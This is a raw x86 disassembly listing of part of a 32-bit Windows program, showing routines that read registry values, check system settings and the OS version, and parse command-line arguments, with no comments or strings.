  40268a:	xor    eax,eax
  40268c:	push   edi
  40268d:	mov    WORD PTR [esp+0x98],ax
  402695:	call   0x4023e0
  40269a:	mov    esi,eax
  40269c:	lea    edx,[esp+0x98]
  4026a3:	push   ecx
  4026a4:	mov    ecx,esi
  4026a6:	call   0x402464
  4026ab:	test   al,al
  4026ad:	je     0x402707
  4026af:	push   esi
  4026b0:	lea    ecx,[esp+0x14]
  4026b4:	call   0x40613c
  4026b9:	lea    ecx,[esp+0x98]
  4026c0:	call   0x402b01
  4026c5:	mov    edi,eax
  4026c7:	test   edi,edi
  4026c9:	je     0x4026fe
  4026cb:	mov    BYTE PTR [edi+0x2c],0x1
  4026cf:	lea    eax,[esp+0x10]
  4026d3:	mov    DWORD PTR [esp+0xc],eax
  4026d7:	test   esi,esi
  4026d9:	je     0x4026e4
  4026db:	lea    ecx,[esp+0xc]
  4026df:	call   0x406521
  4026e4:	push   0x0
  4026e6:	push   ecx
  4026e7:	push   edi
  4026e8:	lea    ecx,[esp+0x1c]
  4026ec:	call   0x403bbc
  4026f1:	test   esi,esi
  4026f3:	je     0x4026fe
  4026f5:	lea    ecx,[esp+0xc]
  4026f9:	call   0x406399
  4026fe:	lea    ecx,[esp+0x10]
  402702:	call   0x40616f
  402707:	mov    ecx,DWORD PTR [esp+0x29c]
  40270e:	pop    edi
  40270f:	pop    esi
  402710:	xor    ecx,esp
  402712:	call   0x407750
  402717:	mov    esp,ebp
  402719:	pop    ebp
  40271a:	ret    
  40271b:	int3   
  40271c:	int3   
  40271d:	int3   
  40271e:	int3   
  40271f:	int3   
  402720:	mov    edi,edi
  402722:	push   ebp
  402723:	mov    ebp,esp
  402725:	push   ecx
  402726:	push   ecx
  402727:	push   ebx
  402728:	push   0x1
  40272a:	xor    ebx,ebx
  40272c:	push   ebx
  40272d:	push   ebx
  40272e:	call   DWORD PTR ds:0x40a004
  402734:	mov    DWORD PTR [ebp-0x8],eax
  402737:	test   eax,eax
  402739:	je     0x4027a4
  40273b:	push   edi
  40273c:	push   0x1
  40273e:	push   0x4011a8
  402743:	push   eax
  402744:	call   DWORD PTR ds:0x40a008
  40274a:	mov    edi,eax
  40274c:	test   edi,edi
  40274e:	je     0x40279a
  402750:	push   esi
  402751:	lea    eax,[ebp-0x4]
  402754:	mov    DWORD PTR [ebp-0x4],ebx
  402757:	push   eax
  402758:	push   ebx
  402759:	push   ebx
  40275a:	push   edi
  40275b:	call   DWORD PTR ds:0x40a030
  402761:	push   DWORD PTR [ebp-0x4]
  402764:	push   ebx
  402765:	call   DWORD PTR ds:0x40a04c
  40276b:	mov    esi,eax
  40276d:	test   esi,esi
  40276f:	je     0x402792
  402771:	lea    eax,[ebp-0x4]
  402774:	push   eax
  402775:	push   DWORD PTR [ebp-0x4]
  402778:	push   esi
  402779:	push   edi
  40277a:	call   DWORD PTR ds:0x40a030
  402780:	test   eax,eax
  402782:	je     0x40278b
  402784:	cmp    DWORD PTR [esi+0x4],0x2
  402788:	sete   bl
  40278b:	push   esi
  40278c:	call   DWORD PTR ds:0x40a088
  402792:	push   edi
  402793:	call   DWORD PTR ds:0x40a000
  402799:	pop    esi
  40279a:	push   DWORD PTR [ebp-0x8]
  40279d:	call   DWORD PTR ds:0x40a000
  4027a3:	pop    edi
  4027a4:	mov    al,bl
  4027a6:	pop    ebx
  4027a7:	mov    esp,ebp
  4027a9:	pop    ebp
  4027aa:	ret    
  4027ab:	int3   
  4027ac:	int3   
  4027ad:	int3   
  4027ae:	int3   
  4027af:	int3   
  4027b0:	mov    edi,edi
  4027b2:	push   ebp
  4027b3:	mov    ebp,esp
  4027b5:	sub    esp,0x284
  4027bb:	mov    eax,ds:0x409004
  4027c0:	xor    eax,ebp
  4027c2:	mov    DWORD PTR [ebp-0x4],eax
  4027c5:	push   ebx
  4027c6:	push   0xc
  4027c8:	pop    ecx
  4027c9:	xor    ebx,ebx
  4027cb:	mov    DWORD PTR [ebp-0x284],ecx
  4027d1:	push   ebx
  4027d2:	lea    eax,[ebp-0x284]
  4027d8:	mov    DWORD PTR [ebp-0x280],ebx
  4027de:	push   eax
  4027df:	push   ecx
  4027e0:	push   0x42
  4027e2:	mov    DWORD PTR [ebp-0x27c],ebx
  4027e8:	call   DWORD PTR ds:0x40a154
  4027ee:	test   eax,eax
  4027f0:	je     0x4028a0
  4027f6:	test   BYTE PTR [ebp-0x280],0x1
  4027fd:	je     0x4028a0
  402803:	lea    eax,[ebp-0x18c]
  402809:	mov    DWORD PTR [ebp-0x18c],0x11c
  402813:	push   eax
  402814:	call   DWORD PTR ds:0x40a044
  40281a:	test   eax,eax
  40281c:	je     0x402829
  40281e:	mov    al,BYTE PTR [ebp-0x72]
  402821:	cmp    al,0x3
  402823:	je     0x4028a0
  402825:	cmp    al,0x2
  402827:	je     0x4028a0
  402829:	call   0x402720
  40282e:	test   al,al
  402830:	je     0x4028a0
  402832:	push   esi
  402833:	push   edi
  402834:	push   0x1a
  402836:	pop    ecx
  402837:	mov    esi,0x4011b8
  40283c:	lea    edi,[ebp-0x70]
  40283f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402841:	push   0x104
  402846:	lea    eax,[ebp-0x278]
  40284c:	push   eax
  40284d:	lea    eax,[ebp-0x70]
  402850:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  402852:	push   eax
  402853:	call   DWORD PTR ds:0x40a134
  402859:	dec    eax
  40285a:	cmp    eax,0x103
  40285f:	ja     0x40289e
  402861:	lea    eax,[ebp-0x278]
  402867:	push   eax
  402868:	call   DWORD PTR ds:0x40a130
  40286e:	test   eax,eax
  402870:	je     0x40289e
  402872:	mov    esi,ebx
  402874:	push   ebx
  402875:	push   0x401224
  40287a:	push   0x40123c
  40287f:	lea    eax,[ebp-0x278]
  402885:	push   eax
  402886:	call   DWORD PTR ds:0x40a164
  40288c:	test   eax,eax
  40288e:	jns    0x40289e
  402890:	push   0x64
  402892:	call   DWORD PTR ds:0x40a060
  402898:	inc    esi
  402899:	cmp    esi,0x1e
  40289c:	jl     0x402874
  40289e:	pop    edi
  40289f:	pop    esi
  4028a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4028a3:	xor    ecx,ebp
  4028a5:	pop    ebx
  4028a6:	call   0x407750
  4028ab:	mov    esp,ebp
  4028ad:	pop    ebp
  4028ae:	ret    
  4028af:	int3   
  4028b0:	int3   
  4028b1:	int3   
  4028b2:	int3   
  4028b3:	int3   
  4028b4:	mov    edi,edi
  4028b6:	push   ebp
  4028b7:	mov    ebp,esp
  4028b9:	and    esp,0xfffffff8
  4028bc:	sub    esp,0x9c
  4028c2:	push   ebx
  4028c3:	push   esi
  4028c4:	push   edi
  4028c5:	xor    edx,edx
  4028c7:	mov    DWORD PTR ds:0x409768,0x1
  4028d1:	mov    esi,0x409750
  4028d6:	mov    DWORD PTR ds:0x409760,edx
  4028dc:	mov    DWORD PTR ds:0x409750,edx
  4028e2:	mov    edi,0x409778
  4028e7:	mov    DWORD PTR ds:0x40976c,edx
  4028ed:	mov    DWORD PTR ds:0x409778,0x401284
  4028f7:	mov    DWORD PTR ds:0x40900c,esi
  4028fd:	mov    ecx,DWORD PTR [edi]
  4028ff:	lea    eax,[esi+0x8]
  402902:	push   eax
  402903:	push   edx
  402904:	push   edx
  402905:	lea    eax,[esp+0x20]
  402909:	mov    DWORD PTR [esp+0x20],ecx
  40290d:	push   eax
  40290e:	push   0x1
  402910:	push   ecx
  402911:	push   esi
  402912:	mov    DWORD PTR [esp+0x34],edx
  402916:	lea    edi,[edi+0x4]
  402919:	push   0x4022c0
  40291e:	mov    DWORD PTR [esi+0x20],ecx
  402921:	call   DWORD PTR ds:0x40a038
  402927:	mov    esi,DWORD PTR [esi]
  402929:	push   0x0
  40292b:	pop    edx
  40292c:	test   esi,esi
  40292e:	jne    0x4028fd
  402930:	push   0x1
  402932:	push   0x100
  402937:	call   DWORD PTR ds:0x40a058
  40293d:	mov    edi,DWORD PTR [ebp+0x8]
  402940:	mov    ebx,DWORD PTR [ebp+0xc]
  402943:	cmp    edi,0x2
  402946:	jne    0x402989
  402948:	mov    ecx,DWORD PTR [ebx+0x4]
  40294b:	mov    eax,0x40117c
  402950:	mov    dx,WORD PTR [eax]
  402953:	cmp    dx,WORD PTR [ecx]
  402956:	jne    0x402976
  402958:	test   dx,dx
  40295b:	je     0x402972
  40295d:	mov    dx,WORD PTR [eax+0x2]
  402961:	cmp    dx,WORD PTR [ecx+0x2]
  402965:	jne    0x402976
  402967:	add    eax,0x4
  40296a:	add    ecx,0x4
  40296d:	test   dx,dx
  402970:	jne    0x402950
  402972:	xor    eax,eax
  402974:	jmp    0x40297b
  402976:	sbb    eax,eax
  402978:	or     eax,0x1
  40297b:	test   eax,eax
  40297d:	jne    0x402989
  40297f:	call   0x40266d
  402984:	jmp    0x402a83
  402989:	call   0x4023e0
  40298e:	push   eax
  40298f:	lea    ecx,[esp+0x24]
  402993:	mov    DWORD PTR [esp+0x20],eax
  402997:	call   0x40613c
  40299c:	xor    esi,esi
  40299e:	inc    esi
  40299f:	cmp    edi,0x3
  4029a2:	jb     0x402a22
  4029a4:	push   DWORD PTR [ebx+0x4]
  4029a7:	push   0x401254
  4029ac:	call   DWORD PTR ds:0x40a050
  4029b2:	test   eax,eax
  4029b4:	jne    0x402a22
  4029b6:	mov    BYTE PTR [esp+0x13],al
  4029ba:	cmp    edi,0x4
  4029bd:	jb     0x4029d6
  4029bf:	push   DWORD PTR [ebx+0xc]
  4029c2:	push   0x40117c
  4029c7:	call   DWORD PTR ds:0x40a050
  4029cd:	test   eax,eax
  4029cf:	jne    0x4029d6
  4029d1:	mov    BYTE PTR [esp+0x13],0x1
  4029d6:	mov    ecx,DWORD PTR [ebx+0x8]
  4029d9:	call   0x402b01
  4029de:	mov    esi,eax
  4029e0:	test   esi,esi
  4029e2:	je     0x402a20
  4029e4:	cmp    DWORD PTR [esp+0x1c],0x0
  4029e9:	mov    al,BYTE PTR [esp+0x13]
  4029ed:	mov    BYTE PTR [esi+0x2c],al
  4029f0:	lea    eax,[esp+0x20]
  4029f4:	mov    DWORD PTR [esp+0x14],eax
  4029f8:	je     0x402a03
  4029fa:	lea    ecx,[esp+0x14]
  4029fe:	call   0x406521
  402a03:	push   0x0
  402a05:	push   ecx
  402a06:	push   esi
  402a07:	lea    ecx,[esp+0x2c]
  402a0b:	call   0x403bbc
  402a10:	cmp    DWORD PTR [esp+0x1c],0x0
  402a15:	je     0x402a20
  402a17:	lea    ecx,[esp+0x14]
  402a1b:	call   0x406399
  402a20:	xor    esi,esi
  402a22:	cmp    edi,0x2
  402a25:	jb     0x402a3b
  402a27:	push   DWORD PTR [ebx+0x4]
  402a2a:	push   0x401264
  402a2f:	call   DWORD PTR ds:0x40a050
  402a35:	neg    eax
  402a37:	sbb    eax,eax
  402a39:	and    esi,eax
  402a3b:	lea    eax,[esp+0x20]
  402a3f:	mov    DWORD PTR [esp+0x14],eax
  402a43:	test   esi,esi
  402a45:	je     0x402a71
  402a47:	lea    ecx,[esp+0x14]
  402a4b:	call   0x406521
  402a50:	call   0x40221e
  402a55:	test   al,al
  402a57:	je     0x402a68
  402a59:	call   0x40233b
  402a5e:	cmp    edi,0x1
  402a61:	jne    0x402a68
  402a63:	call   0x4027b0
  402a68:	lea    ecx,[esp+0x20]
  402a6c:	call   0x403a0f
  402a71:	lea    ecx,[esp+0x14]
  402a75:	call   0x406399
  402a7a:	lea    ecx,[esp+0x20]
  402a7e:	call   0x40616f
  402a83:	mov    esi,DWORD PTR ds:0x40900c
  402a89:	mov    edi,0x40900c
  402a8e:	cmp    esi,edi
  402a90:	je     0x402abc
  402a92:	jmp    0x402ab2
  402a94:	mov    eax,DWORD PTR [esi+0x8]
  402a97:	or     eax,DWORD PTR [esi+0xc]
  402a9a:	je     0x402ab0
  402a9c:	push   DWORD PTR [esi+0xc]
  402a9f:	push   DWORD PTR [esi+0x8]
  402aa2:	call   DWORD PTR ds:0x40a01c
  402aa8:	and    DWORD PTR [esi+0x8],0x0
  402aac:	and    DWORD PTR [esi+0xc],0x0
  402ab0:	mov    esi,DWORD PTR [esi]
  402ab2:	test   esi,esi
  402ab4:	jne    0x402a94
  402ab6:	mov    DWORD PTR ds:0x40900c,edi
  402abc:	pop    edi
  402abd:	xor    eax,eax
  402abf:	pop    esi
  402ac0:	inc    eax
  402ac1:	pop    ebx
  402ac2:	mov    esp,ebp
  402ac4:	pop    ebp
  402ac5:	ret    
  402ac6:	int3   
  402ac7:	int3   
  402ac8:	int3   
  402ac9:	int3   
  402aca:	int3   
  402acb:	mov    edi,edi
  402acd:	push   ebp
  402ace:	mov    ebp,esp
  402ad0:	mov    eax,DWORD PTR [ebp+0x8]
  402ad3:	push   esi
  402ad4:	push   0x2
  402ad6:	mov    esi,ecx
  402ad8:	pop    ecx
  402ad9:	mul    ecx
  402adb:	test   edx,edx
  402add:	jne    0x402af5
  402adf:	cmp    eax,0xffffffff
  402ae2:	ja     0x402af5
  402ae4:	push   eax
  402ae5:	call   DWORD PTR ds:0x40a1e4
  402aeb:	test   eax,eax
  402aed:	mov    DWORD PTR [esi],eax
  402aef:	pop    ecx
  402af0:	setne  al
  402af3:	jmp    0x402af7
  402af5:	xor    al,al
  402af7:	pop    esi
  402af8:	pop    ebp
  402af9:	ret    0x4
  402afc:	int3   
  402afd:	int3   
  402afe:	int3   
  402aff:	int3   
  402b00:	int3   
  402b01:	push   0x1c
  402b03:	mov    eax,0x408032
  402b08:	call   0x407f4f
  402b0d:	mov    edi,ecx
  402b0f:	push   0x4093c0
  402b14:	lea    ecx,[ebp-0x14]
  402b17:	call   0x403341
  402b1c:	xor    ebx,ebx
  402b1e:	mov    DWORD PTR [ebp-0x4],ebx
  402b21:	mov    BYTE PTR [ebp-0x4],0x1
  402b25:	push   0x4013d8
  402b2a:	lea    ecx,[ebp-0x14]
  402b2d:	call   0x40322b
  402b32:	push   edi
  402b33:	lea    ecx,[ebp-0x14]
  402b36:	call   0x40349e
  402b3b:	mov    DWORD PTR [ebp-0x4],ebx
  402b3e:	mov    DWORD PTR [ebp-0x24],ebx
  402b41:	mov    DWORD PTR [ebp-0x20],ebx
  402b44:	mov    DWORD PTR [ebp-0x1c],ebx
  402b47:	mov    BYTE PTR [ebp-0x4],0x3
  402b4b:	mov    DWORD PTR [ebp-0x18],ebx
  402b4e:	lea    eax,[ebp-0x18]
  402b51:	push   eax
  402b52:	push   0x20019
  402b57:	push   ebx
  402b58:	mov    esi,DWORD PTR [ebp-0x14]
  402b5b:	push   esi
  402b5c:	push   0x80000002
  402b61:	call   DWORD PTR ds:0x40a024
  402b67:	test   eax,eax
  402b69:	jne    0x402bba
  402b6b:	mov    ebx,DWORD PTR [ebp-0x18]
  402b6e:	mov    DWORD PTR [ebp-0x24],ebx
  402b71:	push   0x30
  402b73:	call   0x407e01
  402b78:	pop    ecx
  402b79:	mov    DWORD PTR [ebp-0x18],eax
  402b7c:	mov    BYTE PTR [ebp-0x4],0x4
  402b80:	test   eax,eax
  402b82:	je     0x402b90
  402b84:	push   edi
  402b85:	mov    ecx,eax
  402b87:	call   0x402dff
  402b8c:	mov    edi,eax
  402b8e:	jmp    0x402b92
  402b90:	xor    edi,edi
  402b92:	mov    BYTE PTR [ebp-0x4],0x3
  402b96:	mov    DWORD PTR [ebp-0x18],edi
  402b99:	mov    BYTE PTR [ebp-0x4],0x5
  402b9d:	test   edi,edi
  402b9f:	jne    0x402bc6
  402ba1:	mov    BYTE PTR [ebp-0x4],0x3
  402ba5:	and    DWORD PTR [ebp-0x18],edi
  402ba8:	mov    BYTE PTR [ebp-0x4],0x0
  402bac:	test   ebx,ebx
  402bae:	je     0x402bba
  402bb0:	push   ebx
  402bb1:	call   DWORD PTR ds:0x40a034
  402bb7:	and    DWORD PTR [ebp-0x24],edi
  402bba:	or     DWORD PTR [ebp-0x4],0xffffffff
  402bbe:	lea    ecx,[esi-0x10]
  402bc1:	jmp    0x402d0e
  402bc6:	lea    eax,[edi+0x4]
  402bc9:	push   eax
  402bca:	mov    edx,0x401458
  402bcf:	lea    ecx,[ebp-0x24]
  402bd2:	call   0x402eab
  402bd7:	lea    eax,[edi+0x8]
  402bda:	push   eax
  402bdb:	mov    edx,0x401478
  402be0:	lea    ecx,[ebp-0x24]
  402be3:	call   0x402eab
  402be8:	lea    eax,[edi+0xc]
  402beb:	push   eax
  402bec:	mov    edx,0x401490
  402bf1:	lea    ecx,[ebp-0x24]
  402bf4:	call   0x402eab
  402bf9:	lea    eax,[edi+0x10]
  402bfc:	push   eax
  402bfd:	mov    edx,0x4014a4
  402c02:	lea    ecx,[ebp-0x24]
  402c05:	call   0x402eab
  402c0a:	lea    eax,[edi+0x14]
  402c0d:	push   eax
  402c0e:	mov    edx,0x4014bc
  402c13:	lea    ecx,[ebp-0x24]
  402c16:	call   0x402eab
  402c1b:	lea    eax,[edi+0x18]
  402c1e:	push   eax
  402c1f:	mov    edx,0x4014d8
  402c24:	lea    ecx,[ebp-0x24]
  402c27:	call   0x402eab
  402c2c:	lea    eax,[edi+0x1c]
  402c2f:	push   eax
  402c30:	mov    edx,0x4014e8
  402c35:	lea    ecx,[ebp-0x24]
  402c38:	call   0x402eab
  402c3d:	lea    ebx,[edi+0x20]
  402c40:	mov    DWORD PTR [ebx],0x1
  402c46:	push   ebx
  402c47:	push   0x4014f4
  402c4c:	lea    ecx,[ebp-0x24]
  402c4f:	call   0x402161
  402c54:	test   eax,eax
  402c56:	je     0x402c5e
  402c58:	mov    DWORD PTR [ebx],0x1
  402c5e:	lea    ebx,[edi+0x24]
  402c61:	and    DWORD PTR [ebx],0x0
  402c64:	push   ebx
  402c65:	push   0x401528
  402c6a:	lea    ecx,[ebp-0x24]
  402c6d:	call   0x402161
  402c72:	test   eax,eax
  402c74:	je     0x402c79
  402c76:	and    DWORD PTR [ebx],0x0
  402c79:	lea    eax,[edi+0x28]
  402c7c:	push   eax
  402c7d:	mov    edx,0x401560
  402c82:	lea    ecx,[ebp-0x24]
  402c85:	call   0x402eab
  402c8a:	mov    eax,DWORD PTR [edi+0x14]
  402c8d:	mov    ecx,0x401598
  402c92:	mov    dx,WORD PTR [eax]
  402c95:	cmp    dx,WORD PTR [ecx]
  402c98:	jne    0x402cb8
  402c9a:	test   dx,dx
  402c9d:	je     0x402cb4
  402c9f:	mov    dx,WORD PTR [eax+0x2]
  402ca3:	cmp    dx,WORD PTR [ecx+0x2]
  402ca7:	jne    0x402cb8
  402ca9:	add    eax,0x4
  402cac:	add    ecx,0x4
  402caf:	test   dx,dx
  402cb2:	jne    0x402c92
  402cb4:	xor    eax,eax
  402cb6:	jmp    0x402cbd
  402cb8:	sbb    eax,eax
  402cba:	or     eax,0x1
  402cbd:	test   eax,eax
  402cbf:	setne  al
  402cc2:	test   al,al
  402cc4:	je     0x402cce
  402cc6:	lea    ecx,[edi+0x14]
  402cc9:	call   0x4032cf
  402cce:	xor    ebx,ebx
  402cd0:	mov    DWORD PTR [ebp-0x18],ebx
  402cd3:	mov    BYTE PTR [ebp-0x4],0x3
  402cd7:	mov    DWORD PTR [ebp-0x18],ebx
  402cda:	mov    BYTE PTR [ebp-0x4],bl
  402cdd:	cmp    DWORD PTR [ebp-0x24],ebx
  402ce0:	je     0x402cee
  402ce2:	push   DWORD PTR [ebp-0x24]
  402ce5:	call   DWORD PTR ds:0x40a034
  402ceb:	mov    DWORD PTR [ebp-0x24],ebx
  402cee:	or     DWORD PTR [ebp-0x4],0xffffffff
  402cf2:	lea    ecx,[esi-0x10]
  402cf5:	call   0x403776
  402cfa:	mov    eax,edi
  402cfc:	jmp    0x402d15
  402cfe:	mov    eax,0x402d04
  402d03:	ret    
  402d04:	or     DWORD PTR [ebp-0x4],0xffffffff
  402d08:	mov    ecx,DWORD PTR [ebp-0x14]
  402d0b:	lea    ecx,[ecx-0x10]
  402d0e:	call   0x403776
  402d13:	xor    eax,eax
  402d15:	call   0x407e9b
  402d1a:	ret    
  402d1b:	int3   
  402d1c:	int3   
  402d1d:	int3   
  402d1e:	int3   
  402d1f:	int3   
  402d20:	mov    edi,edi
  402d22:	push   ebp
  402d23:	mov    ebp,esp
  402d25:	sub    esp,0x44
  402d28:	mov    eax,ds:0x409004
  402d2d:	xor    eax,ebp
  402d2f:	mov    DWORD PTR [ebp-0x4],eax
  402d32:	push   ebx
  402d33:	mov    ebx,ecx
  402d35:	mov    ecx,0x401598
  402d3a:	push   esi
  402d3b:	push   edi
  402d3c:	xor    esi,esi
  402d3e:	mov    eax,DWORD PTR [ebx+0x14]
  402d41:	mov    dx,WORD PTR [eax]
  402d44:	cmp    dx,WORD PTR [ecx]
  402d47:	jne    0x402d67
  402d49:	test   dx,dx
  402d4c:	je     0x402d63
  402d4e:	mov    dx,WORD PTR [eax+0x2]
  402d52:	cmp    dx,WORD PTR [ecx+0x2]
  402d56:	jne    0x402d67
  402d58:	add    eax,0x4
  402d5b:	add    ecx,0x4
  402d5e:	test   dx,dx
  402d61:	jne    0x402d41
  402d63:	mov    eax,esi
  402d65:	jmp    0x402d6c
  402d67:	sbb    eax,eax
  402d69:	or     eax,0x1
  402d6c:	test   eax,eax
  402d6e:	jne    0x402dc1
  402d70:	push   DWORD PTR [ebx+0xc]
  402d73:	call   DWORD PTR ds:0x40a178
  402d79:	mov    edi,eax
  402d7b:	pop    ecx
  402d7c:	cmp    edi,0x16
  402d7f:	jae    0x402de7
  402d81:	mov    edx,edi
  402d83:	mov    ecx,ebx
  402d85:	call   0x406d55
  402d8a:	test   eax,eax
  402d8c:	je     0x402de7
  402d8e:	imul   ecx,edi,0x18
  402d91:	add    ecx,0x4091b0
  402d97:	mov    eax,DWORD PTR [ecx+0xc]
  402d9a:	dec    eax
  402d9b:	sub    eax,0x1
  402d9e:	jne    0x402de7
  402da0:	mov    eax,DWORD PTR [ecx+0x10]
  402da3:	lea    edx,[ebp-0x40]
  402da6:	push   esi
  402da7:	push   edx
  402da8:	push   eax
  402da9:	push   DWORD PTR [ecx+0x4]
  402dac:	mov    DWORD PTR [ebp-0x40],eax
  402daf:	call   DWORD PTR ds:0x40a154
  402db5:	test   eax,eax
  402db7:	je     0x402de7
  402db9:	mov    esi,DWORD PTR [ebp-0x3c]
  402dbc:	and    esi,0x1
  402dbf:	jmp    0x402de7
  402dc1:	mov    ecx,DWORD PTR [ebx+0x1c]
  402dc4:	cmp    DWORD PTR [ecx-0xc],esi
  402dc7:	jne    0x402dcd
  402dc9:	xor    eax,eax
  402dcb:	jmp    0x402de9
  402dcd:	push   0x1
  402dcf:	lea    edx,[ebp-0x44]
  402dd2:	call   0x40308c
  402dd7:	test   eax,eax
  402dd9:	je     0x402de7
  402ddb:	push   DWORD PTR [ebp-0x44]
  402dde:	call   DWORD PTR ds:0x40a05c
  402de4:	xor    esi,esi
  402de6:	inc    esi
  402de7:	mov    eax,esi
  402de9:	mov    ecx,DWORD PTR [ebp-0x4]
  402dec:	pop    edi
  402ded:	pop    esi
  402dee:	xor    ecx,ebp
  402df0:	pop    ebx
  402df1:	call   0x407750
  402df6:	mov    esp,ebp
  402df8:	pop    ebp
  402df9:	ret    
  402dfa:	int3   
  402dfb:	int3   
  402dfc:	int3   
  402dfd:	int3   
  402dfe:	int3   
  402dff:	push   0x4
  402e01:	mov    eax,0x4080b2
  402e06:	call   0x407edc
  402e0b:	mov    esi,ecx
  402e0d:	mov    DWORD PTR [ebp-0x10],esi
  402e10:	mov    edi,0x4093c0
  402e15:	push   edi
  402e16:	call   0x403341
  402e1b:	and    DWORD PTR [ebp-0x4],0x0
  402e1f:	lea    ecx,[esi+0x4]
  402e22:	push   edi
  402e23:	call   0x403341
  402e28:	lea    ecx,[esi+0x8]
  402e2b:	mov    BYTE PTR [ebp-0x4],0x1
  402e2f:	push   edi
  402e30:	call   0x403341
  402e35:	lea    ecx,[esi+0xc]
  402e38:	mov    BYTE PTR [ebp-0x4],0x2
  402e3c:	push   edi
  402e3d:	call   0x403341
  402e42:	lea    ecx,[esi+0x10]
  402e45:	mov    BYTE PTR [ebp-0x4],0x3
  402e49:	push   edi
  402e4a:	call   0x403341
  402e4f:	lea    ecx,[esi+0x14]
  402e52:	mov    BYTE PTR [ebp-0x4],0x4
  402e56:	push   edi
  402e57:	call   0x403341
  402e5c:	lea    ecx,[esi+0x18]
  402e5f:	mov    BYTE PTR [ebp-0x4],0x5
  402e63:	push   edi
  402e64:	call   0x403341
  402e69:	lea    ecx,[esi+0x1c]
  402e6c:	mov    BYTE PTR [ebp-0x4],0x6
  402e70:	push   edi
  402e71:	call   0x403341
  402e76:	lea    ecx,[esi+0x28]
  402e79:	mov    BYTE PTR [ebp-0x4],0x7
  402e7d:	push   edi
  402e7e:	call   0x403341
  402e83:	push   DWORD PTR [ebp+0x8]
  402e86:	mov    ecx,esi
  402e88:	mov    BYTE PTR [ebp-0x4],0x8
  402e8c:	call   0x40322b
  402e91:	mov    ecx,esi
  402e93:	call   0x4032cf
  402e98:	mov    BYTE PTR [esi+0x2c],0x0
  402e9c:	mov    eax,esi
  402e9e:	call   0x407e9b
  402ea3:	ret    0x4
  402ea6:	int3   
  402ea7:	int3   
  402ea8:	int3   
  402ea9:	int3   
  402eaa:	int3   
  402eab:	push   0x834
  402eb0:	mov    eax,0x4080d2
  402eb5:	call   0x407f8a
  402eba:	mov    eax,edx
  402ebc:	mov    DWORD PTR [ebp-0x824],eax
  402ec2:	mov    esi,ecx
  402ec4:	mov    DWORD PTR [ebp-0x818],esi
  402eca:	mov    edi,DWORD PTR [ebp+0x8]
  402ecd:	xor    ebx,ebx
  402ecf:	inc    ebx
  402ed0:	mov    DWORD PTR [ebp-0x834],esi
  402ed6:	mov    DWORD PTR [ebp-0x81c],ebx
  402edc:	mov    ecx,edi
  402ede:	xor    ebx,ebx
  402ee0:	mov    DWORD PTR [ebp-0x830],eax
  402ee6:	push   0x4015b4
  402eeb:	mov    DWORD PTR [ebp-0x82c],edi
  402ef1:	mov    DWORD PTR [ebp-0x4],ebx
  402ef4:	call   0x40326d
  402ef9:	or     DWORD PTR [ebp-0x4],0xffffffff
  402efd:	lea    eax,[ebp-0x820]
  402f03:	push   eax
  402f04:	push   ebx
  402f05:	push   DWORD PTR [ebp-0x824]
  402f0b:	mov    ecx,esi
  402f0d:	mov    DWORD PTR [ebp-0x820],ebx
  402f13:	call   0x4021a3
  402f18:	test   eax,eax
  402f1a:	jne    0x403072
  402f20:	mov    eax,DWORD PTR [ebp-0x820]
  402f26:	test   eax,eax
  402f28:	je     0x403072
  402f2e:	xor    ecx,ecx
  402f30:	push   0x2
  402f32:	pop    edx
  402f33:	mul    edx
  402f35:	seto   cl
  402f38:	neg    ecx
  402f3a:	or     ecx,eax
  402f3c:	push   ecx
  402f3d:	call   0x407e2f
  402f42:	mov    esi,eax
  402f44:	xor    eax,eax
  402f46:	mov    DWORD PTR [ebp-0x828],esi
  402f4c:	pop    ecx
  402f4d:	test   esi,esi
  402f4f:	je     0x40307f
  402f55:	mov    ecx,DWORD PTR [ebp-0x818]
  402f5b:	mov    WORD PTR [esi],ax
  402f5e:	lea    eax,[ebp-0x820]
  402f64:	push   eax
  402f65:	push   esi
  402f66:	push   DWORD PTR [ebp-0x824]
  402f6c:	call   0x4021a3
  402f71:	test   eax,eax
  402f73:	jne    0x402fa3
  402f75:	cmp    DWORD PTR [ebp-0x820],ebx
  402f7b:	jbe    0x402fa3
  402f7d:	cmp    DWORD PTR [ebp-0x820],0x400
  402f87:	jbe    0x402f90
  402f89:	mov    WORD PTR [esi+0x7fe],ax
  402f90:	push   esi
  402f91:	mov    ecx,edi
  402f93:	mov    DWORD PTR [ebp-0x4],0x2
  402f9a:	call   0x40322b
  402f9f:	or     DWORD PTR [ebp-0x4],0xffffffff
  402fa3:	mov    edx,DWORD PTR [ebp-0x824]
  402fa9:	mov    ecx,DWORD PTR [ebp-0x818]
  402faf:	mov    eax,DWORD PTR [ebp-0x81c]
  402fb5:	cmp    WORD PTR [esi],0x40
  402fb9:	jne    0x403042
  402fbf:	test   eax,eax
  402fc1:	je     0x403042
  402fc3:	push   ebx
  402fc4:	push   0x1
  402fc6:	push   ebx
  402fc7:	push   0x400
  402fcc:	lea    eax,[ebp-0x814]
  402fd2:	push   eax
  402fd3:	push   edx
  402fd4:	push   DWORD PTR [ecx]
  402fd6:	call   DWORD PTR ds:0x40a0f0
  402fdc:	mov    DWORD PTR [ebp-0x4],0x4
  402fe3:	mov    ecx,edi
  402fe5:	test   eax,eax
  402fe7:	jne    0x403034
  402fe9:	mov    WORD PTR [ebp-0x16],ax
  402fed:	lea    eax,[ebp-0x814]
  402ff3:	push   eax
  402ff4:	call   0x40322b
  402ff9:	jmp    0x40303e
  402ffb:	and    DWORD PTR [ebp-0x818],0x0
  403002:	mov    eax,0x403008
  403007:	ret    
  403008:	or     DWORD PTR [ebp-0x4],0xffffffff
  40300c:	xor    ebx,ebx
  40300e:	mov    eax,DWORD PTR [ebp-0x818]
  403014:	mov    esi,DWORD PTR [ebp-0x828]
  40301a:	mov    ecx,DWORD PTR [ebp-0x834]
  403020:	mov    edx,DWORD PTR [ebp-0x830]
  403026:	mov    edi,DWORD PTR [ebp-0x82c]
  40302c:	mov    DWORD PTR [ebp-0x81c],eax
  403032:	jmp    0x402fb5
  403034:	push   0x4015b4
  403039:	call   0x40326d
  40303e:	or     DWORD PTR [ebp-0x4],0xffffffff
  403042:	mov    ebx,DWORD PTR [ebp-0x81c]
  403048:	push   esi
  403049:	call   0x407e3f
  40304e:	pop    ecx
  40304f:	mov    eax,ebx
  403051:	jmp    0x40307f
  403053:	and    DWORD PTR [ebp-0x818],0x0
  40305a:	mov    eax,0x403060
  40305f:	ret    
